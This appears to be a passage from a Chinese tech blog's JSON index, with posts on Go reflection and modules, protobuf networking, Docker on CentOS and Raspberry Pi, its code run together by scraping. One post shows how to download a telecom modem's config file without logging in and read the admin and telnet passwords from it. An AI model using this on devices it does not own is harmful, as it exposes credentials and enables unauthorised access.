&amp;a 指向 a 变量的地址 \\* &amp;b 指向 b 变量的地址 \\*/* swap(&amp;a, &amp;b); fmt.Printf(\"交换后 a 的值 : %d\\n\", a ) fmt.Printf(\"交换后 b 的值 : %d\\n\", b )&#125;func swap(x *int, y *int) &#123; var temp int temp = *x */\\* 保存 x 地址的值 \\*/* *x = *y */\\* 将 y 赋值给 x \\*/* *y = temp */\\* 将 temp 赋值给 y \\*/*&#125; 以上实例允许输出结果为： 1234交换前 a 的值 : 100交换前 b 的值 : 200交换后 a 的值 : 200交换后 b 的值 : 100 奇怪的报错12345678910111213141516171819202122package mainimport \"fmt\"func main() &#123; a := A&#123;&#125; var b []int32 = a.GetB() doSomething(&amp;b) // 正确 doSomething(&amp;(a.GetB()) // 报错 doSomething(&amp;a.GetB()) // 报错&#125;type A struct &#123;&#125;func (a *A) GetB() []int32 &#123; return []int32&#123;1, 2&#125;&#125;func doSomething(tmp *[]int32) &#123; fmt.Println(tmp)&#125; Reference https://golang.org/ref/spec https://blog.csdn.net/qq_36431213/article/details/82967982","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】类型转换 - 获取变量类型","date":"2020-01-30T06:32:15.000Z","path":"2020/01/30/【Golang】类型转换 - 获取变量类型/","text":"如果某个函数的入参的类型是 interface{}，有下面几种方法可以获取入参的类型： 获取入参类型的方法1 反射1234567891011import ( \"reflect\" \"fmt\")func main() &#123; v := \"hello world\" fmt.Println(typeof(v))&#125;func typeof(v interface&#123;&#125;) string &#123; return reflect.TypeOf(v).String()&#125; Example其实，fmt.Sprintf(&quot;%T&quot;) 底层也是用反射实现的： 1234567891011func (p *pp) printArg(arg interface&#123;&#125;, verb rune) &#123; ... // Special processing considerations. // %T (the value's type) and %p (its address) are special; we always do them first. switch verb &#123; case 'T': p.fmt.fmtS(reflect.TypeOf(arg).String()) return ... &#125;&#125; Usage: 12345678import \"fmt\"func main() &#123; v := \"hello world\" fmt.Println(typeof(v))&#125;func typeof(v interface&#123;&#125;) string &#123; return fmt.Sprintf(\"%T\", v)&#125; 2 类型断言（Type Assertion）安全的类型断言（Type Assertion）12345678910111213141516func main() &#123; v := \"hello world\" fmt.Println(typeof(v))&#125;func typeof(v interface&#123;&#125;) string &#123; switch t := v.(type) &#123; case int: return \"int\" case float64: return \"float64\" //... etc default: _ = t return \"unknown\" &#125;&#125; 注意，这里的 v 必须为 initerface{} 类型才可以进行类型断言。比如下面代码就会报错： 1234s := \"BrainWu\"if v, ok := s.(string); ok &#123; // invalid type assertion: s.(string) (non-interface type string on left) fmt.Println(v)&#125; 在这里只要是在声明时或函数传进来的参数不是 interface{} 类型，那么做类型断言都是会报 non-interface 错误的。 所以我们只能通过将 s 先转换为一个 interface{}类型，然后才能进行类型断言： 1234s := \"BrainWu\"if v, ok := interface&#123;&#125;(s).(string); ok &#123; fmt.Println(v)&#125; 分析reflect.TypeOf() 的参数是 i interface{}，返回一个Type 类型的struct： 123456789101112131415161718192021222324// TypeOf returns the reflection Type that represents the dynamic type of i.// If i is a nil interface value, TypeOf returns nil.func TypeOf(i interface&#123;&#125;) Type &#123; eface := *(*emptyInterface)(unsafe.Pointer(&amp;i)) return toType(eface.typ)&#125;// rtype is the common implementation of most values.// It is embedded in other struct types.//// rtype must be kept in sync with ../runtime/type.go:/^type._type.type rtype struct &#123; size uintptr ptrdata uintptr // number of bytes in the type that can contain pointers hash uint32 // hash of type; avoids computation in hash tables tflag tflag // extra type information flags align uint8 // alignment of variable with this type fieldAlign uint8 // alignment of struct field with this type kind uint8 // enumeration for C alg *typeAlg // algorithm table gcdata *byte // garbage collection data str nameOff // string form ptrToThis typeOff // type for pointer to this type, may be zero&#125; Main: 123456789101112131415package mainimport ( \"fmt\" \"reflect\")type AAA struct &#123; bb string&#125;func main() &#123; a := AAA&#123;bb: \"temp\"&#125; fmt.Printf(\"%v\", reflect.TypeOf(a))&#125; 我们来看看 Golang 的反射是怎么做到的？ 在 Golang中，interface也是一个结构体，包含两个attribute（分别是 1 个指针）： 指针1：指向该变量的类型 指针2：指向该变量的value 如下，空 interface （即未定义任何内容的interface）对应的结构体如下所示： 12345// emptyInterface is the header for an interface&#123;&#125; value.type emptyInterface struct &#123; typ *rtype word unsafe.Pointer&#125; 第一个指针的类型是type rtype struct。 非空 interface 由于需要携带的信息更多（例如该接口实现了哪些方法），所以第一个 attribute 是 itab，它是一个 struct 指针类型，在这个 struct 中记录了该变量的动态类型 typ *rtype。 1234567891011121314// nonEmptyInterface is the header for a interface value with methods.type nonEmptyInterface struct &#123; // see ../runtime/iface.go:/Itab itab *struct &#123; ityp *rtype // static interface type typ *rtype // dynamic concrete type link unsafe.Pointer bad int32 unused int32 fun [100000]unsafe.Pointer // method table &#125; word unsafe.Pointer&#125; 我们来看看 reflect.TypeOf(): 123456// TypeOf returns the reflection Type that represents the dynamic type of i.// If i is a nil interface value, TypeOf returns nil.func TypeOf(i interface&#123;&#125;) Type &#123; eface := *(*emptyInterface)(unsafe.Pointer(&amp;i)) return toType(eface.typ)&#125; 可以看到，调用 TypeOf 时传入的是 interface{}，它将变量的地址转换为空接口，然后将得到的 rtype 实例转为 Type 接口返回。 需要注意，当调用 reflect.TypeOf 的之前，其实已经发生了一次隐式的类型转换，即将具体类型的向空接口转换。这个过程比较简单，只要拷贝typ *rtype和word unsafe.Pointer就可以了。 例如w := os.Stdout，该变量的接口值在内存里是这样的： 那么，类型断言是怎么判断是不是某个接口呢？回到最初，在golang中，接口是一个松耦合的概念，一个类型是不是实现了某个接口，就是看该类型是否实现了该接口要求的所有函数，所以，类型断言判断的方法就是检查该类型是否实现了接口要求的所有函数。 Reference https://ieevee.com/tech/2017/07/29/go-type.html https://blog.csdn.net/u012807459/article/details/30050391 https://medium.com/golangspec/type-assertions-in-go-e609759c42e1","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Linux】CentOS 安装Docker","date":"2020-01-30T06:18:07.000Z","path":"2020/01/30/【Linux】CentOS-安装Docker/","text":"卸载旧版本较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。 12345678$ sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine 安装 Docker Engine-Community使用 Docker 仓库进行安装在新主机上首次安装 Docker Engine-Community 之前，需要设置 Docker 仓库。之后，您可以从仓库安装和更新 Docker。 设置仓库 安装所需的软件包。yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。 123$ sudo yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 使用以下命令来设置稳定的仓库。 123$ sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo 安装 Docker Engine-Community安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本： 1$ sudo yum install docker-ce docker-ce-cli containerd.io 运行启动 Docker。 1$ sudo systemctl start docker 通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。 1$ sudo docker run hello-world","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Protobuf】Protocol Buffers 入门","date":"2020-01-29T10:24:40.000Z","path":"2020/01/29/【Protobuf】Protocol-Buffers-入门/","text":"Install1 安装 protoc去 https://github.com/protocolbuffers/protobuf/releases 下载。 将bin目录下的protoc.exe拷贝到GOPATH/bin目录下，将include/目录下的google文件夹拷贝GOPATH/src目录下（只有使用protobuf的一些内置结构才需要用到该文件夹内的文件，这次并不会用到这个文件夹）。 2 安装proto-gen-go安装protobuf的编译器插件protoc-gen-goprotoc程序会调用protoc-gen-go，将.proto文件生成golang代码。可以使用go get命令安装： 1234567$ go get -u github.com/golang/protobuf/proto$ go get -u github.com/golang/protobuf/protoc-gen-go # 然后将环境变量GOPATH定义的目录下的bin目录加入到环境变量PATH中。$ vi ~/.bashrc# 然后在该文件最后加上：export PATH=\"$PATH:$GOPATH/bin\"即可。$ source ~/.bashrc 安装成功后，会在GOPATH/bin下生成protoc-gen-go.exe程序。 Usage1 定义一个proto文件test.protoProto21234567891011121314package example;enum FOO &#123; X = 17;&#125;;message Test &#123; required string label = 1; optional int32 type = 2 [default = 77]; repeated int64 reps = 3; optional group OptionalGroup = 4 &#123; required string RequiredField = 5; &#125;&#125; proto32 编译 .proto 文件（生成go文件）1$ protoc --go_out=. *.proto 执行 protoc，并使用 --go_out 选项指定输出目录，即可生成 Go 源码文件。因为安装了 protoc-gen-go 之后，--go_out 选项会自动搜索 protoc-gen-go，只要其在 PATH 目录中可以找到即可。 如果这个命令执行过程中出现 protoc-gen-go: program not found or is not executable 这个错误，表示该protoc-gen-go没有被加入到Path环境变量中，应该把该文件的所在目录加入Path变量中。该文件存放在环境变量GOPATH目录下的bin子目录里。 --go_out 支持以下参数 plugins=plugin1+plugin2 指定插件，目前只支持 grpc，即：plugins=grpc M 参数 指定导入的.proto文件路径编译后对应的golang包名(不指定本参数默认就是.proto文件中import语句的路径) import_prefix=xxx 为所有 import 路径添加前缀，主要用于编译子目录内的多个 proto 文件，这个参数按理说很有用，尤其适用替代一些情况时的 M 参数。 import_path=foo/bar 用于指定未声明 package 或 go_package 的文件的包名，最右面的斜线前的字符会被忽略 Protobuf 消息定义消息由至少一个字段组合而成，类似于C语言中的结构。每个字段都有一定的格式。 字段格式：限定修饰符 | 数据类型 | 字段名称 | = | 字段编码值 | [字段默认值] 限定修饰符包含 required、optional、repeated Required：表示是一个必须字段，必须相对于发送方，在发送消息之前必须设置该字段的值，对于接收方，必须能够识别该字段的意思。发送之前没有设置required字段或者无法识别required字段都会引发编解码异常，导致消息被丢弃。 Optional：表示是一个可选字段，可选对于发送方，在发送消息时，可以有选择性的设置或者不设置该字段的值。对于接收方，如果能够识别可选字段就进行相应的处理，如果无法识别，则忽略该字段，消息中的其它字段正常处理。—因为optional字段的特性，很多接口在升级版本中都把后来添加的字段都统一的设置为optional字段，这样老的版本无需升级程序也可以正常的与新的软件进行通信，只不过新的字段无法识别而已，因为并不是每个节点都需要新的功能，因此可以做到按需升级和平滑过渡。 Repeated：表示该字段可以包含0~N个元素。其特性和optional一样，但是每一次可以包含多个值。可以看作是在传递一个数组的值。 enum1234567message ShippingDiscount &#123; enum ClientType &#123; PDP = 0; CHECKOUT = 1; &#125; required ClientType client = 1;&#125; Array123message Result &#123; repeated string snippets = 3;&#125; Data TypesSee https://developers.google.com/protocol-buffers/docs/proto#enum for more details. protobuf 数据类型 描述 打包 C++语言映射 bool 布尔类型 1字节 bool double 64位浮点数 N double float 32为浮点数 N float int32 32位整数、 N int uin32 无符号32位整数 N unsigned int int64 64位整数 N __int64 uint64 64为无符号整 N unsigned __int64 sint32 32位整数，处理负数效率更高 N int32 sing64 64位整数 处理负数效率更高 N __int64 fixed32 32位无符号整数 4 unsigned int32 fixed64 64位无符号整数 8 unsigned __int64 sfixed32 32位整数、能以更高的效率处理负数 4 unsigned int32 sfixed64 64为整数 8 unsigned __int64 string 只能处理 ASCII字符 N std::string bytes 用于处理多字节的语言字符、如中文 N std::string enum 可以包含一个用户自定义的枚举类型uint32 N(uint32) enum message 可以包含一个用户自定义的消息类型 N object of class Demotest.proto1234567891011121314syntax = \"proto3\"; //指定版本，必须要写（proto3、proto2） package proto;enum FOO &#123; X = 0; &#125;;//message是固定的。UserInfo是类名，可以随意指定，符合规范即可message UserInfo&#123; string message = 1; //消息 int32 length = 2; //消息大小 int32 cnt = 3; //消息计数&#125; client_protobuf.go1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( \"bufio\" \"fmt\" \"net\" \"os\" stProto \"proto\" \"time\" //protobuf编解码库,下面两个库是相互兼容的，可以使用其中任意一个 \"github.com/golang/protobuf/proto\" //\"github.com/gogo/protobuf/proto\")func main() &#123; strIP := \"localhost:6600\" var conn net.Conn var err error //连接服务器 for conn, err = net.Dial(\"tcp\", strIP); err != nil; conn, err = net.Dial(\"tcp\", strIP) &#123; fmt.Println(\"connect\", strIP, \"fail\") time.Sleep(time.Second) fmt.Println(\"reconnect...\") &#125; fmt.Println(\"connect\", strIP, \"success\") defer conn.Close() //发送消息 cnt := 0 sender := bufio.NewScanner(os.Stdin) for sender.Scan() &#123; cnt++ stSend := &amp;stProto.UserInfo&#123; Message: sender.Text(), Length: *proto.Int(len(sender.Text())), Cnt: *proto.Int(cnt), &#125; //protobuf编码 pData, err := proto.Marshal(stSend) if err != nil &#123; panic(err) &#125; //发送 conn.Write(pData) if sender.Text() == \"stop\" &#123; return &#125; &#125;&#125; server_protobuf.go1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package mainimport ( \"fmt\" \"net\" \"os\" stProto \"proto\" //protobuf编解码库,下面两个库是相互兼容的，可以使用其中任意一个 \"github.com/golang/protobuf/proto\" //\"github.com/gogo/protobuf/proto\")func main() &#123; //监听 listener, err := net.Listen(\"tcp\", \"localhost:6600\") if err != nil &#123; panic(err) &#125; for &#123; conn, err := listener.Accept() if err != nil &#123; panic(err) &#125; fmt.Println(\"new connect\", conn.RemoteAddr()) go readMessage(conn) &#125;&#125;//接收消息func readMessage(conn net.Conn) &#123; defer conn.Close() buf := make([]byte, 4096, 4096) for &#123; //读消息 cnt, err := conn.Read(buf) if err != nil &#123; panic(err) &#125; stReceive := &amp;stProto.UserInfo&#123;&#125; pData := buf[:cnt] //protobuf解码 err = proto.Unmarshal(pData, stReceive) if err != nil &#123; panic(err) &#125; fmt.Println(\"receive\", conn.RemoteAddr(), stReceive) if stReceive.Message == \"stop\" &#123; os.Exit(1) &#125; &#125;&#125; Protobuf 传输文件 https://ops.tips/blog/sending-files-via-grpc/ https://gobyexample.com/reading-files https://blog.csdn.net/sanduan168/article/details/80452649 https://www.jianshu.com/p/030b03532961 https://www.jianshu.com/p/1a3f1c3031b5 Reference https://developers.google.com/protocol-buffers/docs/proto#enum https://segmentfault.com/a/1190000009277748","comments":true,"categories":[{"name":"Protobuf","slug":"Protobuf","permalink":"http://swsmile.info/categories/Protobuf/"}],"tags":[{"name":"Protobuf","slug":"Protobuf","permalink":"http://swsmile.info/tags/Protobuf/"}]},{"title":"【Golang】上传文件","date":"2020-01-29T10:14:56.000Z","path":"2020/01/29/【Golang】使用-上传文件/","text":"单文件上传我们使用multipart/form-data格式上传文件，利用c.Request.FormFile解析文件。 123456789101112131415161718// HandleUploadFile 上传单个文件func HandleUploadFile(c *gin.Context) &#123; file, header, err := c.Request.FormFile(\"file\") if err != nil &#123; c.JSON(http.StatusBadRequest, gin.H&#123;\"msg\": \"文件上传失败\"&#125;) return &#125; content, err := ioutil.ReadAll(file) if err != nil &#123; c.JSON(http.StatusBadRequest, gin.H&#123;\"msg\": \"文件读取失败\"&#125;) return &#125; fmt.Println(header.Filename) fmt.Println(string(content)) c.JSON(http.StatusOK, gin.H&#123;\"msg\": \"上传成功\"&#125;)&#125; # Reference https://razeencheng.com/post/gin-file-down-upload https://www.kancloud.cn/shuangdeyu/gin_book/949420","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Raspbeery Pi】树莓派玩耍","date":"2020-01-29T09:54:38.000Z","path":"2020/01/29/【Raspbeery】树莓派玩耍/","text":"查看树莓派系统的位数安装软件的时候想查看树莓派系统是32位还是64位就出现了以下的操作，具体命令及作用如下： 12345678getconf LONG_BIT # 查看系统位数uname -a # kernel 版本/opt/vc/bin/vcgencmd version # firmware版本strings /boot/start.elf | grep VC_BUILD_ID # firmware版本cat /proc/version # kernelcat /etc/os-release # OS版本资讯cat /etc/issue # Linux distro 版本cat /etc/debian_version # Debian版本编号 虽然树莓派3b的硬件支持64位的系统，但是官方的系统还是32位的，主要应该是为了兼容之前的硬件。 ErrorError1 - cannot currently show the desktop vnc1$ sudo raspi-config Advanced Options &gt; Resolution, select the appropriate resolution. Reference https://raspberrypi.stackexchange.com/questions/101796/raspberry-pi-4-vnc-remote-connection-desktop-error","comments":true,"categories":[{"name":"RaspbeeryPi","slug":"RaspbeeryPi","permalink":"http://swsmile.info/categories/RaspbeeryPi/"}],"tags":[{"name":"RaspbeeryPi","slug":"RaspbeeryPi","permalink":"http://swsmile.info/tags/RaspbeeryPi/"}]},{"title":"【Network】电信光猫内网穿透","date":"2020-01-29T09:50:50.000Z","path":"2020/01/29/【Network】电信光猫内网穿透/","text":"Environmental Info天翼网关-GPON，型号: PT921G 获取登录光猫的超级管理员密码访问&lt;your gateway domain&gt;/romfile.cfg，比/如 http://192.168.1.1/romfile.cfg，此后就会下载一个名为romfile.cfg的文件，这个romfile.cfg就是光猫的配置文件。 搜索 telecomadmin 就可以获取到登录光猫的超级管理员密码。 地址栏里输入192.168.1.1，用超级用户登录： 怎么样，页面和以前不一样了，可以看到并设置各项参数，这个大家就根据个人需求来改动吧： 如果想获取更多的参数，就在下载的光猫配置文件（romfile.cfg）里面找。比如说你想知道telnet账号和密码，你就搜telnet就找到了。 以此类推，拨号账号密码、hgw账号密码、itms账号密码、ftp账号密码、SIP电话号码、SIP账号密码都有）。 PT921G默认是关闭telnet的，但是在使用超级用户登录的 UI 中（http://192.168.1.1/telnet.asp），可以开启 telnet。 telnet 的账号密码都在光猫配置文件（http://192.168.1.1/romfile.cfg）中。 设置为桥接模式让电信将光猫从路由模式改为桥接模式；并让电信告诉你宽带账号及密码， 打 10000 以为电信光猫分配独立的公网 IP现在电信光猫对外的 IP 都不是公网IP，如果登陆电信光猫发现wan口IP是 100.*.*.* ，则不是公网IP，100.*这个网段是保留网段，专门留给电信运营商的（电信100.64.0.0 - 100.127.255.255的IP是运营商NAT大内网）。 这时要做的就是打电信客服电话10000要求其将自己的光猫IP换为独立的公网IP，当然换成的公网IP也是动态变化的，固定的公网IP是要另外收费的。 如果你觉得你的光猫获取的IP可能不是公网IP，自行打开www.ip138.com自检一下，看看ip138中显示的IP和给光猫分配的IP是否相同，相同则是公网IP，否则就是电信将你的光猫 NAT 了。 需要注意的是，不是公网IP就肯定做不了端口映射。 非公网IP的光猫 有公网IP的光猫 // TODO need to double check 设置家里的无线路由器的WAN口设置为PPOE口，使用第1步得到的宽带账号密码连接，这样家里的WIFI和局域网才能上网； 设置端口映射在无线路由器上能查到光猫的公网地址，并在无线路由器上设置端口映射（注意，不是光猫）； 公网IP是会变化最后还有一个问题是家庭电信宽带的公网IP是会变化的，据说可以通过在路由器上设置DDNS（动态DNS）彻底解决，这样不管家里的公网IP怎么变，直接通过访问动态DNS就行了。 刚好家里有一个原来用过的TP-LINK路由器支持动态DNS功能： 当然，你也使用其他 DDNS 服务。 Reference https://blog.csdn.net/TAlice/article/details/86644107 http://bbs.mydigit.cn/read.php?tid=1983767 https://blog.51cto.com/yuweibing/2372135","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Golang】Golang 使用 UUID","date":"2020-01-12T12:49:23.000Z","path":"2020/01/12/【Golang】使用-使用-UUID/","text":"什么是 UUID？UUID 是Universally Unique Identifier的缩写，即通用唯一识别码。 uuid的目的是让分布式系统中的所有元素，都能有唯一的辨识资讯，而不需要透过中央控制端来做辨识资讯的指定。如此一来，每个人都可以建立不与其它人冲突的 uuid。 A universally unique identifier (UUID) is a 128-bit number used to identify information in computer systems. Go 中使用 UUID目前，golang中的uuid还没有纳入标准库，我们使用github上的开源库： 1$ go get -u github.com/satori/go.uuid 使用： 1234567891011121314151617181920package mainimport ( \"fmt\" \"github.com/satori/go.uuid\")func main() &#123; // 创建 u1 := uuid.NewV4() fmt.Printf(\"UUIDv4: %s\\n\", u1) // 解析 u2, err := uuid.FromString(\"f5394eef-e576-4709-9e4b-a7c231bd34a4\") if err != nil &#123; fmt.Printf(\"Something gone wrong: %s\", err) return &#125; fmt.Printf(\"Successfully parsed: %s\", u2)&#125;","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】Golang 的环境变量","date":"2020-01-12T12:31:55.000Z","path":"2020/01/12/【Golang】Go-的环境变量/","text":"一句话概括，GOPATH中保存的是第三方依赖库的内容，GOROOT中保存的是原生的 go 工具的内容。 GOPATH go get和其他 go 工具等会用到GOPATH环境变量。 GOPATH是作为编译后二进制的存放目的地和import包时的搜索路径（其实也是你的工作目录, 你可以在src下创建你自己的go源文件, 然后开始工作）。 GOPATH之下主要包含三个目录: bin、pkg、src： bin目录主要存放可执行文件（第三方包中包含的可执行文件）； 123456789$ echo $GOPATH/Users/wei.shi/go$ cd $GOPATH/bin$ pwd/Users/wei.shi/go/bin$ lsair gin httptest mockgen richgo test_kafka_clientdata_pipeline goimports ips_event_consumer protoc-gen-go spkiteasytags golangci-lint item_discount realize test_client pkg目录存放编译好的库文件, 主要是*.a文件； src目录下主要存放go的源文件。 123456789$ cd ~$ mkdir gopath# 在~/.bash_profile中添加如下语句:GOPATH=/Users/username/gopath# GOPATH可以是一个目录列表, 通过 go get下载的第三方库, 都会被下载到 src 文件夹中# 而且，还需要把GOPATH中的可执行目录也配置到环境变量中, 否则你自行下载的第三方go工具就无法使用了, 操作如下:# 在~/bash_profile（或者~/.zshrc，根据你使用什么 bash 决定）中增加下面这行export $PATH:$GOPATH/bin GOROOTGOROOT就是go的安装路径。 在~/.bash_profile中添加下面语句: 12GOROOT=\"/usr/local/go\"export PATH=\"$PATH:$GOPATH/bin\" 12","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】Golang 依赖管理 - go module","date":"2020-01-12T12:24:23.000Z","path":"2020/01/12/【Golang】依赖-Golang 依赖管理-go-mod/","text":"go mod 命令如何使用 go mod在默认情况下，$GOPATH 默认情况下是不支持 go mudules 的。 在.zshrc 或者.bashrc中声明环境变量： 12# go moduleexport GO111MODULE=on 使声明立刻生效（以.zshrc 为例）： 1$ source ~/.zshrc 我们 $GOPATH 以外的目录创建一个 testmod 的包： 12345678$ mkdir testmod$ cd testmod$ echo 'package testmod import \"fmt\" func SayHello(name string) string &#123; return fmt.Sprintf(\"Hello, %s\", name)&#125;' &gt;&gt; testmod.go初始化 module： 12$ go mod init github.com/sw/testmodgo: creating new go.mod: module github.com/sw/testmod 以上命令会在项目中创建一个 go.mod 文件，初始化内容如下： 1module github.com/sw/testmod 这时，我们的项目已经成为了一个 module 了。 然后在该目录下执行 go build netproc.go ，就可以了。你将看到： 1234$ go build netproc.gogo: finding github.com/mitchellh/go-wordwrap latestgo: finding github.com/maruel/panicparse/stack latestgo: finding github.com/nsf/termbox-go latest go命令（go build, go test, 甚至go list）被执行时，就会下载依赖包，并把依赖信息添加到 go.mod 文件中，自动修改后 go.mod文件新内容如下： 12345678910module github.com/silenceshell/netprocrequire ( github.com/gizak/termui v2.2.0+incompatible github.com/maruel/panicparse v1.1.1 // indirect github.com/mattn/go-runewidth v0.0.3 // indirect github.com/mitchellh/go-wordwrap v0.0.0-20180828145344-9e67c67572bc // indirect github.com/nsf/termbox-go v0.0.0-20180819125858-b66b20ab708e // indirect github.com/spf13/pflag v1.0.2 // indirect) 可见，go.mod中记录了依赖包及其版本号。 Go Module 的科学性分析 1在go mudules 出现之前，通常，一个项目中会有很多个包，而项目内有些包需要依赖项目内其它包。 假设项目有个包，它的包名为 sw/mypackage。当项目内的其它包需要引用这个包时，就可以通过以下引用： 1import myproject/mypackage 但你有没有想过，当别的项目需要引用你的项目中的某些包，那么就需要远程下载依赖包了，这时就需要项目的仓库地址引用，比如下面这样： 1import github.com/sw/myproject/mypackage go modules 发布之后，就完全统一了包引用的地址。 如上面我们说的创建 go.mod 文件后，初始化内容的第一行就是我们说的项目依赖路径，通常来说该地址就是项目的仓库地址，所有需要引用项目包的地址都填写这个地址，无论是内部之间引用还是外部引用。 分析 2在npm 中，我们通常会遇到这样的情况： 12345678910111213$ tree.└── node_modules ├── babel-traverse │ └── ... │ └── node_modules │ └── ms │ └── ... └── basic-auth ├── ... └── node_modules └── ms └── ... 我们项目需要依赖于 babel-traverse和 basic-auth包，而这两个包又都需要依赖一个名为 ms 的第三方包，这时，这个 ms包就会在文件系统中存在两份。 可以想象，如果某个第三方包，会被我们项目中依赖的包依赖 N 次，则这个第三方包就会在文件系统中存在 N 份。 go module 的科学性就在于此： 所有的依赖包都存储在$GOPATH中，不管是我们项目本身依赖的第三方包，还是我们项目本身依赖的第三方包所依赖的第三方包。 而且，当同一个第三方包存在多个版本会被依赖时（甚至是同一个版本的不同 commit），Go 会以{包名称}@{版本号}-{日期}-{hash} 的格式命名该包所在是文件夹，比如 sys@v0.0.0-20190422165155-953cdadca894、sys@v0.0.0-20190813064441-fde4db37ae7a。 Go mod 的子命令golang 提供了 go mod命令来管理包。 go mod 有以下子命令： 命令 说明 download download modules to local cache(下载依赖包) edit edit go.mod from tools or scripts（编辑go.mod graph print module requirement graph (打印模块依赖图) init initialize new module in current directory（在当前目录初始化mod） tidy add missing and remove unused modules(拉取缺少的模块，移除不用的模块) vendor make vendored copy of dependencies(将依赖复制到vendor下) verify verify dependencies have expected content (验证依赖是否正确） why explain why packages or modules are needed(解释为什么需要依赖) 比如，运行： 1$ go mod tidy 示例 - 创建一个新项目在GOPATH 目录之外新建一个目录，并使用go mod init 初始化生成go.mod 文件 12345678910$ mkdir hello$ cd hello$ go mod init hellogo: creating new go.mod: module hello$ lsgo.mod$ cat go.modmodule hellogo 1.12 go.mod文件一旦创建后，它的内容将会被go toolchain全面掌控。go toolchain会在各类命令执行时，比如go get、go build、go mod等修改和维护go.mod文件。 go.mod 提供了module, require、replace和exclude 四个命令： module 语句指定包的名字（路径） require 语句指定的依赖项模块 replace 语句可以替换依赖项模块 exclude 语句可以忽略依赖项模块 添加依赖新建一个 server.go 文件，写入以下代码： 123456789101112131415package mainimport ( \"net/http\" \"github.com/labstack/echo\")func main() &#123; e := echo.New() e.GET(\"/\", func(c echo.Context) error &#123; return c.String(http.StatusOK, \"Hello, World!\") &#125;) e.Logger.Fatal(e.Start(\":1323\"))&#125; 执行 go run server.go 运行代码会发现 go mod 会自动查找依赖自动下载： 12345678910111213141516171819$ go run server.gogo: finding github.com/labstack/echo v3.3.10+incompatiblego: downloading github.com/labstack/echo v3.3.10+incompatiblego: extracting github.com/labstack/echo v3.3.10+incompatiblego: finding github.com/labstack/gommon/color latestgo: finding github.com/labstack/gommon/log latestgo: finding github.com/labstack/gommon v0.2.8# 此处省略很多行... ____ __ / __/___/ / ___ / _// __/ _ \\/ _ \\/___/\\__/_//_/\\___/ v3.3.10-devHigh performance, minimalist Go web frameworkhttps://echo.labstack.com____________________________________O/_______ O\\⇨ http server started on [::]:1323 现在查看go.mod 内容： 1234567891011121314$ cat go.modmodule hellogo 1.12require ( github.com/labstack/echo v3.3.10+incompatible // indirect github.com/labstack/gommon v0.2.8 // indirect github.com/mattn/go-colorable v0.1.1 // indirect github.com/mattn/go-isatty v0.0.7 // indirect github.com/valyala/fasttemplate v1.0.0 // indirect golang.org/x/crypto v0.0.0-20190313024323-a1f597ede03a // indirect) go module 安装 package 的原則是先拉最新的 release tag，若无tag则拉最新的commit，详见 Modules官方介绍。 go 会自动生成一个 go.sum 文件来记录 dependency tree： 12345678$ cat go.sumgithub.com/labstack/echo v3.3.10+incompatible h1:pGRcYk231ExFAyoAjAfD85kQzRJCRI8bbnE7CX5OEgg=github.com/labstack/echo v3.3.10+incompatible/go.mod h1:0INS7j/VjnFxD4E2wkz67b8cVwCLbBmJyDaka6Cmk1s=github.com/labstack/gommon v0.2.8 h1:JvRqmeZcfrHC5u6uVleB4NxxNbzx6gpbJiQknDbKQu0=github.com/labstack/gommon v0.2.8/go.mod h1:/tj9csK2iPSBvn+3NLM9e52usepMtrd5ilFYA+wQNJ4=github.com/mattn/go-colorable v0.1.1 h1:G1f5SKeVxmagw/IyvzvtZE4Gybcc4Tr1tf7I8z0XgOg=github.com/mattn/go-colorable v0.1.1/go.mod h1:FuOcm+DKB9mbwrcAfNl7/TZVBZ6rcnceauSikq3lYCQ=... 省略很多行 再次执行脚本 go run server.go 发现跳过了检查并安装依赖的步骤。 可以使用命令 go list -m -u all 来检查可以升级的package，使用go get -u need-upgrade-package 升级后会将新的依赖版本更新到go.mod * 也可以使用 go get -u 升级所有依赖 go get 运行 go get -u 将会升级这个依赖库到最新的次要版本或者修订版本(x.y.z, z是修订版本号， y是次要版本号) 运行 go get -u=patch 将会升级到最新的修订版本 运行 go get package@&lt;version&gt; 将会升级到指定的版本号version 运行go get如果有版本的更改，那么go.mod文件也会更改 下载非官方依赖Problem1234567$ go get git.xxx.com/yyy/core-logicgo: downloading git.xxx.com/yyy/core-logic v0.0.41verifying git.xxx.com/yyy/core-logic@v0.0.41: git.xxx.com/yyy/core-logic@v0.0.41: reading https://sum.golang.org/lookup/git.xxx.com/yyy/core-logic@v0.0.41: 410 Gone# or$ go get git.xxx.com/core-logicgo: git.xxx.com/core-logic@v0.0.41: reading 